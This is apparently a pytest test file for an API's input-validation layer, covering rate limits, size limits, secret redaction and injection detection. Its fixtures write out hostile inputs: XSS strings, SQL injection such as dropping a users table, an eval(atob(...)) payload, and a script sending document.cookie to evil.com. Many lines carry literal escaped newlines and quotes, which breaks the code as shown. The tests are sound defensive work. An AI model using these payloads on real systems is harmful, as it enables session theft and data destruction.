"""
Tests for input validation and security measures

Comprehensive test suite for validating all security measures including
request size limits, parameter validation, rate limiting, and injection detection.
"""

import json
import time
from unittest.mock import Mock, patch

import pytest

from ..core.validation import RateLimiter, InputValidator, SecurityValidator
from ..core.constants import APIConstants, ValidationMessages
from ..core.exceptions import ValidationError


class TestRateLimiter:
    """Test rate limiting functionality"""
    
    def test_allows_requests_under_limit(self):
        """Test that requests under the limit are allowed"""
        limiter = RateLimiter(max_requests=5, window_seconds=60)
        client_ip = "192.168.1.1"
        
        # Should allow 5 requests
        for _ in range(5):
            assert limiter.is_allowed(client_ip) is True
    
    def test_blocks_requests_over_limit(self):
        """Test that requests over the limit are blocked"""
        limiter = RateLimiter(max_requests=3, window_seconds=60)
        client_ip = "192.168.1.1"
        
        # Allow 3 requests
        for _ in range(3):
            assert limiter.is_allowed(client_ip) is True
        
        # Block the 4th request
        assert limiter.is_allowed(client_ip) is False
    
    def test_burst_limiting(self):
        """Test burst limiting functionality"""
        limiter = RateLimiter(max_requests=60, window_seconds=60, burst_limit=3)
        client_ip = "192.168.1.1"
        
        # Allow burst of 3
        for _ in range(3):
            assert limiter.is_allowed(client_ip) is True
        
        # Block the 4th burst request
        assert limiter.is_allowed(client_ip) is False
    
    def test_different_ips_independent(self):
        """Test that different IPs have independent limits"""
        limiter = RateLimiter(max_requests=2, window_seconds=60)
        
        # IP1 uses up its limit
        assert limiter.is_allowed("192.168.1.1") is True
        assert limiter.is_allowed("192.168.1.1") is True
        assert limiter.is_allowed("192.168.1.1") is False
        
        # IP2 should still be allowed
        assert limiter.is_allowed("192.168.1.2") is True
        assert limiter.is_allowed("192.168.1.2") is True
    
    def test_window_reset(self):
        """Test that rate limit resets after window"""
        limiter = RateLimiter(max_requests=1, window_seconds=1)
        client_ip = "192.168.1.1"
        
        # Use up the limit
        assert limiter.is_allowed(client_ip) is True
        assert limiter.is_allowed(client_ip) is False
        
        # Wait for window to reset
        time.sleep(1.1)
        
        # Should be allowed again
        assert limiter.is_allowed(client_ip) is True
    
    def test_get_remaining(self):
        """Test getting remaining requests"""
        limiter = RateLimiter(max_requests=5, window_seconds=60)
        client_ip = "192.168.1.1"
        
        assert limiter.get_remaining(client_ip) == 5
        
        limiter.is_allowed(client_ip)
        assert limiter.get_remaining(client_ip) == 4
        
        limiter.is_allowed(client_ip)
        assert limiter.get_remaining(client_ip) == 3


class TestInputValidator:
    """Test input validation functionality"""
    
    @pytest.fixture
    def validator(self):
        return InputValidator()
    
    def test_request_size_validation(self, validator):
        """Test request size limits"""
        # Should allow normal size
        validator.validate_request_size(1000)
        
        # Should reject oversized request
        with pytest.raises(ValidationError, match=ValidationMessages.REQUEST_TOO_LARGE):
            validator.validate_request_size(APIConstants.MAX_REQUEST_SIZE + 1)
    
    def test_json_depth_validation(self, validator):
        """Test JSON nesting depth limits"""
        # Create deeply nested object
        deep_object = {}\n        current = deep_object\n        for i in range(APIConstants.MAX_JSON_DEPTH + 1):\n            current['nested'] = {}\n            current = current['nested']\n        \n        with pytest.raises(ValidationError, match=\"nesting exceeds maximum depth\"):\n            validator.validate_json_structure(deep_object)
    
    def test_string_length_validation(self, validator):
        """Test string length limits"""
        # Normal string should pass
        validator.validate_string_parameter(\"test\", \"normal string\")\n        \n        # Too long string should fail\n        long_string = \"x\" * (APIConstants.MAX_STRING_LENGTH + 1)\n        with pytest.raises(ValidationError, match=\"exceeds maximum length\"):\n            validator.validate_string_parameter(\"test\", long_string)
    
    def test_array_length_validation(self, validator):
        """Test array length limits"""
        # Normal array should pass
        normal_array = list(range(100))\n        validator.validate_json_structure(normal_array)\n        \n        # Too long array should fail\n        long_array = list(range(APIConstants.MAX_ARRAY_LENGTH + 1))\n        with pytest.raises(ValidationError, match=\"exceeds maximum length\"):\n            validator.validate_json_structure(long_array)
    
    def test_method_name_validation(self, validator):
        """Test method name validation"""
        allowed_methods = {\"run_skill\", \"run_bridge\", \"chat_query\"}\n        \n        # Valid method should pass
        validator.validate_method_name(\"run_skill\", allowed_methods)\n        \n        # Invalid method should fail\n        with pytest.raises(ValidationError):\n            validator.validate_method_name(\"invalid_method\", allowed_methods)\n        \n        # Method with invalid characters should fail\n        with pytest.raises(ValidationError):\n            validator.validate_method_name(\"run-skill!\", allowed_methods)\n        \n        # Too long method should fail\n        long_method = \"x\" * 51\n        with pytest.raises(ValidationError):\n            validator.validate_method_name(long_method, allowed_methods)
    
    def test_skill_name_validation(self, validator):
        """Test skill name validation"""
        allowed_skills = {\"echo\", \"sifter\", \"lead_scout\"}\n        \n        # Valid skill should pass
n        validator.validate_skill_name(\"echo\", allowed_skills)\n        \n        # Invalid skill should fail\n        with pytest.raises(ValidationError):\n            validator.validate_skill_name(\"invalid_skill\", allowed_skills)
    
    def test_response_type_validation(self, validator):
        """Test response type validation"""
        allowed_types = {\"json\", \"email\", \"chat\"}\n        \n        # Valid type should pass\n        validator.validate_response_type(\"json\", allowed_types)\n        \n        # Invalid type should fail\n        with pytest.raises(ValidationError):\n            validator.validate_response_type(\"xml\", allowed_types)\n        \n        # Type with invalid characters should fail\n        with pytest.raises(ValidationError):\n            validator.validate_response_type(\"json<script>\", allowed_types)
    
    def test_dict_parameter_validation(self, validator):
        """Test dictionary parameter validation"""
        # Valid dict should pass\n        validator.validate_dict_parameter(\"params\", {\"key\": \"value\"})\n        \n        # None should pass if not required\n        validator.validate_dict_parameter(\"params\", None, required=False)\n        \n        # None should fail if required\n        with pytest.raises(ValidationError):\n            validator.validate_dict_parameter(\"params\", None, required=True)\n        \n        # Non-dict should fail\n        with pytest.raises(ValidationError):\n            validator.validate_dict_parameter(\"params\", \"not a dict\")
    
    def test_error_message_sanitization(self, validator):
        \"\"\"Test error message sanitization\"\"\"
        # Should remove sensitive information\n        message = \"Error: password=secret123 and token=abc456\"\n        sanitized = validator.sanitize_error_message(message)\n        \n        assert \"secret123\" not in sanitized\n        assert \"abc456\" not in sanitized\n        assert \"<hidden>\" in sanitized\n        \n        # Should truncate long messages\n        long_message = \"x\" * 600\n        sanitized = validator.sanitize_error_message(long_message)\n        assert len(sanitized) <= 504  # 500 + \"...\"
    
    def test_log_data_sanitization(self, validator):
        \"\"\"Test log data sanitization\"\"\"
        sensitive_data = {\n            \"username\": \"user123\",\n            \"password\": \"secret\",\n            \"api_key\": \"key123\",\n            \"data\": {\n                \"token\": \"token456\",\n                \"safe_field\": \"safe_value\"\n            }\n        }\n        \n        sanitized = validator.sanitize_log_data(sensitive_data)\n        \n        assert sanitized[\"username\"] == \"user123\"  # Non-sensitive kept\n        assert sanitized[\"password\"] == \"<hidden>\"  # Sensitive hidden\n        assert sanitized[\"api_key\"] == \"<hidden>\"  # Sensitive hidden\n        assert sanitized[\"data\"][\"token\"] == \"<hidden>\"  # Nested sensitive hidden\n        assert sanitized[\"data\"][\"safe_field\"] == \"safe_value\"  # Nested non-sensitive kept


class TestSecurityValidator:
    \"\"\"Test security validation functionality\"\"\"
    
    @pytest.fixture
    def validator(self):
        return SecurityValidator()
    
    def test_script_injection_detection(self, validator):
        \"\"\"Test detection of script injections\"\"\"
        malicious_inputs = [\n            \"<script>alert('xss')</script>\",\n            \"javascript:alert('xss')\",\n            \"vbscript:msgbox('xss')\",\n            \"onload=alert('xss')\",\n            \"onerror=alert('xss')\"\n        ]\n        \n        for malicious_input in malicious_inputs:\n            assert validator.detect_injection_attempt(malicious_input) is True
    
    def test_sql_injection_detection(self, validator):
        \"\"\"Test detection of SQL injections\"\"\"
        malicious_inputs = [\n            \"SELECT * FROM users\",\n            \"INSERT INTO users VALUES\",\n            \"UPDATE users SET password\",\n            \"DELETE FROM users\",\n            \"DROP TABLE users\",\n            \"UNION SELECT password FROM users\",\n            \"'; DROP TABLE users; --\"\n        ]\n        \n        for malicious_input in malicious_inputs:\n            assert validator.detect_injection_attempt(malicious_input) is True
    
    def test_safe_input_passes(self, validator):
        \"\"\"Test that safe input passes validation\"\"\"
        safe_inputs = [\n            \"Hello world\",\n            \"user@example.com\",\n            \"Normal text with numbers 123\",\n            \"Query about business metrics\"\n        ]\n        \n        for safe_input in safe_inputs:\n            assert validator.detect_injection_attempt(safe_input) is False
    
    def test_nested_injection_detection(self, validator):
        \"\"\"Test detection in nested data structures\"\"\"
        # Should detect injection in nested data\n        malicious_data = {\n            \"user\": \"normal_user\",\n            \"params\": {\n                \"query\": \"<script>alert('xss')</script>\",\n                \"safe_param\": \"safe_value\"\n            }\n        }\n        \n        with pytest.raises(ValidationError):\n            validator.validate_safe_input(malicious_data)\n        \n        # Should pass safe nested data\n        safe_data = {\n            \"user\": \"normal_user\",\n            \"params\": {\n                \"query\": \"What are my priorities?\",\n                \"context\": \"business planning\"\n            }\n        }\n        \n        # Should not raise exception\n        validator.validate_safe_input(safe_data)


class TestIntegrationValidation:
    \"\"\"Integration tests for complete validation pipeline\"\"\"
    
    def test_complete_request_validation(self):
        \"\"\"Test complete request validation pipeline\"\"\"
        from ..mcp.schemas import validate_mcp_request\n        \n        # Valid request should pass\n        valid_request = {\n            \"method\": \"chat_query\",\n            \"params\": {\n                \"query\": \"What are my priorities this week?\"\n            },\n            \"response_type\": \"json\",\n            \"id\": \"test-123\"\n        }\n        \n        result = validate_mcp_request(valid_request)\n        assert result.method == \"chat_query\"\n        assert result.params[\"query\"] == \"What are my priorities this week?\"\n        \n        # Invalid request should fail\n        invalid_requests = [\n            {},  # Missing method\n            {\"method\": \"invalid_method\"},  # Unknown method\n            {\"method\": \"chat_query\", \"params\": \"not_a_dict\"},  # Invalid params\n            {\"method\": \"chat_query\", \"response_type\": \"invalid_type\"},  # Invalid response type\n        ]\n        \n        for invalid_request in invalid_requests:\n            with pytest.raises(ValidationError):\n                validate_mcp_request(invalid_request)
    
    def test_large_request_handling(self):
        \"\"\"Test handling of large requests\"\"\"
        validator = InputValidator()\n        \n        # Create large but valid request\n        large_params = {f\"param_{i}\": f\"value_{i}\" for i in range(45)}  # Under limit\n        validator.validate_dict_parameter(\"params\", large_params)\n        \n        # Create oversized request\n        oversized_params = {f\"param_{i}\": f\"value_{i}\" for i in range(55)}  # Over limit\n        with pytest.raises(ValidationError):\n            validator.validate_dict_parameter(\"params\", oversized_params)
    
    def test_malicious_payload_rejection(self):
        \"\"\"Test rejection of various malicious payloads\"\"\"
        security_validator = SecurityValidator()\n        \n        malicious_payloads = [\n            {\n                \"method\": \"chat_query\",\n                \"params\": {\n                    \"query\": \"<script>fetch('http://evil.com/steal?data='+document.cookie)</script>\"\n                }\n            },\n            {\n                \"method\": \"run_skill\",\n                \"params\": {\n                    \"skill_name\": \"echo\",\n                    \"input\": {\n                        \"data\": \"'; DROP TABLE users; --\"\n                    }\n                }\n            },\n            {\n                \"method\": \"run_bridge\",\n                \"params\": {\n                    \"function_name\": \"weekly_digest\",\n                    \"params\": {\n                        \"eval_code\": \"eval(atob('YWxlcnQoJ1hTUycpOw=='))\"  # base64 encoded XSS\n                    }\n                }\n            }\n        ]\n        \n        for payload in malicious_payloads:\n            with pytest.raises(ValidationError):\n                security_validator.validate_safe_input(payload)